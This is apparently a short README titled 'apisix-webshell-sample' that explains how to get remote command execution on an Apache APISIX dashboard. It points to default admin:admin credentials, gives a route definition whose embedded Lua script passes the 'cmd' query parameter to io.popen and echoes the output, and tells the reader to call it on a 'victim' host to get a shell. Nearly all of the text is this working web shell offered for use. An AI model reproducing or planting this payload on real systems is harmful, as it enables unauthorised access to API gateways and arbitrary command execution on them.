# apisix-webshell-sample
apisix admin dashboard script RCE web shell sample

## APISIX - Authed RCE

APISIX Dashboard default at port 9080

and you can have default credit admin:admin to get admin login.

### create route and edit like this.

```
{
  "uri": "/rceEndpoint",
  "name": "RCE{not same}",
  "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
  "upstream": {
    "nodes": [
      {
        "host": "example.com",
        "port": 80,
        "weight": 1
      }
    ],
    "type": "roundrobin",
    "hash_on": "vars",
    "scheme": "http",
    "pass_host": "pass"
  },
  "status": 1
}
```

and using Http://victim:port/rceEndpoint?cmd={your_command}

to get an shell.

.....to be continued.
